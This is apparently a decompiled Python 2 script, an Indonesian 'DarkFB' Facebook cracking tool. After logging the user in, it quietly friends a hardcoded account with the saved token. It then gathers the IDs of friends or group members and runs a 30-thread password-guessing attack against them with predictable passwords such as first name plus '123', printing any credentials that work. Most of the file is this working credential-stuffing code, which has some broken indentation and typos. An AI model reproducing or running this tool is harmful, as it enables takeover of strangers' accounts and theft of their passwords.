# !/usr/bin/python2
# coding=utf-8
# uncompyle6 version 3.6.4
# python bytecode 2.7 (62211)
# ReCode Modar Raimu Cok
# Belajar Secara Otodidak Itu Sangat Berarti
# Skill Tanpa Alat Tidak Akan Berjalan Sempurna , Alat Tanpa Skill Tidak Akan Berjalan
# Hargai Author , Buat Script Itu Nggak Segampang Buat Anak
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding("utf8")
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [("User-Agent", "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16")]


def keluar():
	print("\33[0;31m[✘] Exit")
	os.sys.exit()
	
	
def acak(x):
	w = "mhkpbcP"
	d = ""
	for i in x:
		d += "!"+w[random.randint(0,len(w)-1)]+i
	return cetak(d)
	
	
def cetak(x):
    w = "mhkbpcP"
    for i in w:
        j = w.index(i)
        x= x.replace("!%s"%i,"\033[%s;1m"%str(31+j))
    x += "\033[0m"
    x = x.replace("!0","\033[0m")
    sys.stdout.write(x+"\n")
    
    
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0000.1)
		
		
logo1 = """
\33[0;32m________              ______ _________________ 
\33[0;32m___  __ \_____ __________  /____  ____/__  __ )
\33[0;32m__  / / /  __ `/_  ___/_  //_/_  /_   __  __  |
\33[0;32m_  /_/ // /_/ /_  /   _  ,<  _  __/   _  /_/ / 
\33[0;32m/_____/ \__,_/ /_/    /_/|_| /_/SIMPEL/_____/ 1.0
\33[0;32m══════════════════════════════════════════════════
"""
logo2 = """
\33[0;32m________              ______ _________________ 
\33[0;32m___  __ \_____ __________  /____  ____/__  __ )
\33[0;32m__  / / /  __ `/_  ___/_  //_/_  /_   __  __  |
\33[0;32m_  /_/ // /_/ /_  /   _  ,<  _  __/   _  /_/ / 
\33[0;32m/_____/ \__,_/ /_/    /_/|_| /_/SIMPEL/_____/ 1.0
\33[0;32m══════════════════════════════════════════════════
\33[0;34m[⨳] \33[0;36mAuthor    \33[0;38m➤ \33[0;32mVinz ID
\33[0;34m[⨳] \33[0;36mEmail     \33[0;38m➤ \33[0;32mvinz071003.id@gmail.com
\33[0;34m[⨳] \33[0;36mThanks To \33[0;38m➤ \33[0;32mMr.B1NY4M1N & Mr.B3xC0
\33[0;32m══════════════════════════════════════════════════
"""
logo3 = """
\33[0;32m________              ______ _________________ 
\33[0;32m___  __ \_____ __________  /____  ____/__  __ )
\33[0;32m__  / / /  __ `/_  ___/_  //_/_  /_   __  __  |
\33[0;32m_  /_/ // /_/ /_  /   _  ,<  _  __/   _  /_/ / 
\33[0;32m/_____/ \__,_/ /_/    /_/|_| /_/SIMPEL/_____/ 1.0
"""

def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r\33[0;34m[❃] \33[0;36mSedang Masuk \33[0;38m"+o),;sys.stdout.flush();time.sleep(1)
		
		
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\33[0;31mNot Vuln"
vuln = "\33[0;32mVuln"


def siapa():
	os.system("clear")
	print logo2
	print("\33[0;34m[✪] \33[0;36mDATA LOGIN \33[0;34m[✪]")
	nama = raw_input("\33[0;34m[❉] \33[0;36mNama \33[0;38m➢ \33[0;32m")
	umur = raw_input("\33[0;34m[❉] \33[0;36mUmur \33[0;38m➢ \33[0;32m")
	if nama =="":
		print("\33[0;31m[✘] Isi Yang Benar")
		time.sleep(2)
		siapa()
	if umur =="":
		print("\33[0;31m[✘] Isi Yang Benar")
		time.sleep(2)
		siapa()
	else:
		os.system("clear")
		print logo1
		jalan("\33[0;34m[❉] \33[0;36mWelcome \33[0;32m"+nama+"\n\33[0;34m[❉] \33[0;36mSemoga Di Umur \33[0;32m"+umur+" \33[0;36mSemakin Dewasa Menjuah Juah \n\33[0;34m[❉] \33[0;32m"+nama+" \33[0;36mGanteng Jangan Lupa Subrek Channel Admin")
		time.sleep(2)
		loginSC()
		
		
def loginSC():
	os.system("clear")
	print logo2
	print("\33[0;34m[✪] \33[0;36mLOGIN SCRIPT \33[0;34m[✪]")
	username = raw_input("\33[0;34m[❉] \33[0;36mUsername \33[0;38m➢ \33[0;32m")
	password = raw_input("\33[0;34m[❉] \33[0;36mPassword \33[0;38m➢ \33[0;32m")
	if username =="kang" and password =="hack":
		tik()
		print("\n\33[0;32m[✔] Login Success")
		time.sleep(3)
		login()
	else:
		tik()
		print("\n\33[0;31m[✘] Username/Password Salah")
		time.sleep(3)
		loginSC()
		time.sleep(1)
                LoginSC()
		
		
def login():
	os.system("clear")
	try:
		toket = open("login.txt","r")
		menu()
	except (KeyError,IOError):
		os.system("clear")
		print logo2
		print("\33[0;34m[✪] \33[0;36mLOGIN FACEBOOK \33[0;34m[✪]")
		id = raw_input("\33[0;34m[❉] \33[0;36mID/Email \33[0;38m➢ \33[0;32m")
		pwd = raw_input("\33[0;34m[❉] \33[0;36mPassword \33[0;38m➢ \33[0;32m")
		tik()
		try:
			br.open("https://m.facebook.com")
		except mechanize.URLError:
			print("\n\33[0;31m[✘] Error No Connection")
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form["email"] = id
		br.form["pass"] = pwd
		br.submit()
		url = br.geturl()
		if "save-device" in url:
			try:
				sig=("api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail="+id+"format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword="+pwd+"return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32")
				data ={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({"sig":a})
				url =("https://api.facebook.com/restserver.php")
				r=requests.get(url,params=data)
				v=json.loads(r.text)
				vinz = open("login.txt", "w")
				vinz.write(v["access_token"])
				vinz.close()
				print("\n\33[0;32m[✔] Login Success")
				requests.post("https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token="+v["access_token"])
				menu()
			except requests.exceptions.ConnectionError:
				print("\n\33[0;31m[✘] Error No Connection")
				keluar()
		if "checkpoint" in url:
			tik()
			print("\n\33[0;33m[✘] Account Checkpoint")
			os.system("rm -rf login.txt")
			time.sleep(1)
			keluar()
		else:
			tik()
			print("\n\33[0;31m[✘] Email/Password Salah")
			os.system("rm -rf login.txt")
			time.sleep(1)
			login()
		
		
def menu():
    os.system("clear")
    try:
        toket = open("login.txt", "r").read()
    except IOError:
        os.system("clear")
        print "\33[0;31m[✘] Token Invalid"
        os.system("rm -rf login.txt")
        time.sleep(1)
        keluar()

    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except KeyError:
        os.system("clear")
        print "\33[0;31m[✘] Token Invalid"
        os.system("rm -rf login.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print "\33[0;31m[✘] Error No Connection"
        keluar()

    os.system("clear")
    print logo3
    print"\33[0;32m═══════════════════════════════════════════════════"
    print "\33[0;34m[❋] \33[0;36m Nama \33[0;38m➢ \33[0;32m"+nama+"\33[0;38m"
    print "\33[0;34m[❋] \33[0;36m ID   \33[0;38m➢ \33[0;32m"+id+"\33[0;38m"
    print"\33[0;32m═══════════════════════════════════════════════════"
    print "\n\33[0;34m[1]. \33[0;36mHack Facebook Simpel.v1"
    print "\33[0;34m[0]. \33[0;31mLogOut"
    pilih()
    
    
def pilih():
    unikers = raw_input("\n\33[0;38m ➥ \33[0;32m")
    if unikers == "":
        print("\33[0;31m[✘] Isi Yang Benar")
        pilih()
    else:
        if unikers == "1":
            super()
        else:
            if unikers == "0":
                os.system("clear")
                jalan("Menghapus Token")
                os.system("rm -rf login.txt")
                keluar()
            else:
                print("\33[0;31m[✘] Isi Yang Benar")
                pilih()


def super():
    global toket
    os.system("clear")
    try:
        toket = open("login.txt", "r").read()
    except IOError:
        print("\33[0;31m[✘] Token Invalid")
        os.system("rm -rf login.txt")
        time.sleep(1)
        keluar()

    os.system("clear")
    print logo1
    print "\33[0;34m[1]. \33[0;36mCrack Dari Daftar Teman"
    print "\33[0;34m[2]. \33[0;36mCrack Dari ID Teman"
    print "\33[0;34m[3]. \33[0;36mCrack Dari Member Group"
    print "\33[0;34m[0]. \33[0;31mKembali"
    pilih_super()


def pilih_super():
    global checkpoint
    global oks
    peak = raw_input("\n\33[0;38m ➥ \33[32;1m")
    if peak == "":
        print("\33[0;31m[✘] Isi Yang Benar")
        pilih_super()
    else:
        if peak == "1":
            os.system("clear")
            print logo1
            jalan("\33[0;34m[✺] \33[0;36mMengambil ID \33[0;38m...")
            r = requests.get("https://graph.facebook.com/me/friends?access_token=" + toket)
            z = json.loads(r.text)
            for s in z["data"]:
                id.append(s["id"])

        else:
            if peak == "2":
                os.system("clear")
                print logo1
                idt = raw_input("\33[0;34m[✺] \33[0;36mMasukan ID Teman \33[0;38m: \33[0;32m")
                try:
                    jok = requests.get("https://graph.facebook.com/"+idt+"?access_token=" + toket)
                    op = json.loads(jok.text)
                    print "\33[0;34m[✺] \33[0;36mNama Teman \33[0;38m➢ \33[0;32m" + op["name"]
                except KeyError:
                    print("\33[0;31m[✘] Teman Tidak Ditemukan")
                    raw_input("\n\33[0;34m[ \33[0;36mKembali \33[0;34m]")
                    super()

                jalan("\33[0;34m[✺] \33[0;36mMengambil ID \33[0;38m...")
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token=" + toket)
                z = json.loads(r.text)
                for i in z["data"]:
                    id.append(i["id"])

            else:
                if peak == "3":
                    os.system("clear")
                    print logo1
                    idg = raw_input("\33[0;34m[✺] \33[36;1mMasukan ID Group \33[0;38m➢ \33[0;32m")
                    try:
                        r = requests.get("https://graph.facebook.com/group/?id="+idg+"&access_token=" + toket)
                        asw = json.loads(r.text)
                        print "\33[0;34m[✺] \33[0;36mNama Teman \33[0;38m➢ \33[0;32m" + asw["name"]
                    except KeyError:
                        print("\33[0;31m[✘] Group Tidak Ditemukan")
                        raw_input("\n\33[0;34m[ \33[0;36mKembali \33[0;34m]")
                        super()

                    jalan("\33[0;34m[✺] \33[36;1mMengambil ID \33[0;38m...")
                    re = requests.get("https://graph.facebook.com/"+idg+"/members?fields=name,id&limit=999999999&access_token=" + toket)
                    s = json.loads(re.text)
                    for p in s["data"]:
                        id.append(p["id"])

                    else:
                        if peak == "0":
                            menu()
                        else:
                            print("\33[0;31m[✘] Isi Yang Benar")
                            pilih_super()
        print"\33[0;34m[✺] \33[0;36mTotal ID \33[0;38m➢ \33[0;32m" + str(len(id))
        titik = [".   ","..  ","... "]
	for o in titik:
		print("\r\33[0;34m[✺] \33[0;36mCrack \033[0;38m\n"+o),;sys.stdout.flush();time.sleep(1)
	print"\33[0;32m═══════════════════════════════════════════════════"
	
	
    def main(arg):
        user = arg
        try:
                a = requests.get("https://graph.facebook.com/" +user+ "/?access_token=" + toket)
                b = json.loads(a.text)
                pass1 = b["first_name"] + "123"
                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                q = json.load(data)
                if "access_token" in q:
                    print "\33[0;33m[✘] CHECKPOINT"
                    print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                    print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                    print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass1 + "\n"
                else:
                    if "www.facebook.com" in q["error_msg"]:
                        print "\33[0;32m[✔] BERHASIL"
                        print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" +b["name"]
                        print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                        print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass1 + "\n"
                    else:
                        pass2 = b["firs_name"] + "12345"
                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                        q = json.load(data)
                        if "access_token" in q:
                            print "\33[0;33m[✘] CHECKPOINT"
                            print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                            print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                            print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass2 + "\n"
                        else:
                            if "www.facebook.com" in q["error_msg"]:
                                print "\33[0;33m[✔] BERHASIL"
                                print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass2 + "\n"
                            else:
                                pass3 = "FreeFire"
                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                q = json.load(data)
                                if "access_token" in q:
                                    print "\33[0;33m[✘] CHECKPOINT"
                                    print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                    print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                    print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass3 + "\n"
                                else:
                                    if "www.facebook.com" in q["error_msg"]:
                                        print "\33[0;33m[✔] BERHASIL"
                                        print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                        print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                        print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass3 + "\n"
                                    else:
                                    	pass4 = "Bangsat"
                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                        q = json.load(data)
                                        if "access_token" in q:
                                            print "\33[0;33m[✘] CHECKPOINT"
                                            print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                            print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                            print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass4 + "\n"
                                        else:
                                            if "www.facebook.com" in q["error_msg"]:
                                                print "\33[0;33m[✔] BERHASIL"
                                                print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass4 + "\n"
                                            else:
                                            	pass5 = "Sayang"
                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                q = json.load(data)
                                                if "access_token" in q:
                                                    print "\33[0;33m[✘] CHECKPOINT"
                                                    print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                    print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                    print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass5 + "\n"
                                                else:
                                                    if "www.facebook.com" in q["error_msg"]:
                                                        print "\33[0;33m[✔] BERHASIL"
                                                        print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                        print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                        print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass5 + "\n"
                                                    else:
                                                    	pass6 = "Indonesia"
                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                        q = json.load(data)
                                                        if "access_token" in q:
                                                            print "\33[0;33m[✘] CHECKPOINT"
                                                            print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                            print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                            print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass6 + "\n"
                                                        else:
                                                            if "www.facebook.com" in q["error_msg"]:
                                                                print "\33[0;33m[✔] BERHASIL"
                                                                print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass6 + "\n"
                                                            else:
                                                            	pass7 = "Kontol"
                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                q = json.load(data)
                                                                if "access_token" in q:
                                                                    print "\33[0;33m[✘] CHECKPOINT"
                                                                    print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                    print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                    print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass7 + "\n"
                                                                else:
                                                                    if "www.facebook.com" in q["error_msg"]:
                                                                        print "\33[0;33m[✔] BERHASIL"
                                                                        print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                        print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                        print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass7 + "\n"
                                                                    else:
                                                                    	pass8 = "Bajingan"
                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                        q = json.load(data)
                                                                        if "access_token" in q:
                                                                            print "\33[0;33m[✘] CHECKPOINT"
                                                                            print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                            print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                            print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass8 + "\n"
                                                                        else:
                                                                            if "www.facebook.com" in q["error_msg"]:
                                                                                print "\33[0;33m[✔] BERHASIL"
                                                                                print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                                print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                                print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass8 + "\n"
                                                                            else:
                                                                            	pass9 = "Jancok"
                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                q = json.load(data)
                                                                                if "access_token" in q:
                                                                                    print "\33[0;33m[✘] CHECKPOINT"
                                                                                    print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                                    print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                                    print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass9 + "\n"
                                                                                else:
                                                                                    if "www.facebook.com" in q["error_msg"]:
                                                                                        print "\33[0;33m[✔] BERHASIL"
                                                                                        print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                                        print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                                        print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass9 + "\n"
                                                                                    else:
                                                                                    	pass10 = b["first_name"] + "MKS"
                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                        q = json.load(data)
                                                                                        if "access_token" in q:
                                                                                            print "\33[0;33m[✘] CHECKPOINT"
                                                                                            print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                                            print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                                            print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass10 + "\n"
                                                                                        else:
                                                                                            if "www.facebook.com" in q["error_msg"]:
                                                                                                print "\33[0;33m[✔] BERHASIL"
                                                                                                print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                                                print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                                                print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass10 + "\n"
                                                                                            else:
                                                                                            	pass11 = "Corona"
                                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                q = json.load(data)
                                                                                                if "access_token" in q:
                                                                                                    print "\33[0;33m[✘] CHECKPOINT"
                                                                                                    print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                                                    print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                                                    print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass11 + "\n"
                                                                                                else:
                                                                                                    if "www.facebook.com" in q["error_msg"]:
                                                                                                        print "\33[0;33m[✔] BERHASIL"
                                                                                                        print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                                                        print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                                                        print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass11 + "\n"
                                                                                                    else:
                                                                                                    	pass12 = "Frontal"
                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                        q = json.load(data)
                                                                                                        if "access_token" in q:
                                                                                                            print "\33[0;33m[✘] CHECKPOINT"
                                                                                                            print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                                                            print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                                                            print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass12 + "\n"
                                                                                                        else:
                                                                                                            if "www.facebook.com" in q["error_msg"]:
                                                                                                                print "\33[0;33m[✔] BERHASIL"
                                                                                                                print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                                                                print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                                                                print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass12 + "\n"
                                                                                                            else:
                                                                                                            	pass13 = "Anjing"
                                                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                q = json.load(data)
                                                                                                                if "access_token" in q:
                                                                                                                    print "\33[0;33m[✘] CHECKPOINT"
                                                                                                                    print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                                                                    print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                                                                    print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass13 + "\n"
                                                                                                                else:
                                                                                                                    if "www.facebook.com" in q["error_msg"]:
                                                                                                                        print "\33[0;33m[✔] BERHASIL"
                                                                                                                        print "\33[0;34m[✤] \33[0;36mNama \33[0;38m➢ \33[0;32m" + b["name"]
                                                                                                                        print "\33[0;34m[✤] \33[0;36mID   \33[0;38m➢ \33[0;32m" + user
                                                                                                                        print "\33[0;34m[✤] \33[0;36mPW   \33[0;38m➢ \33[0;32m" + pass13 + "\n"
                                                                                                                
                                                                                                                
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print("\n\33[0;34m[ \33[0;36mSelesai \33[0;34m]")
    raw_input("\33[0;34m[ \33[0;36mKembali \33[0;34m]")
    super()
    
    
if __name__ =="__main__":
	siapa()
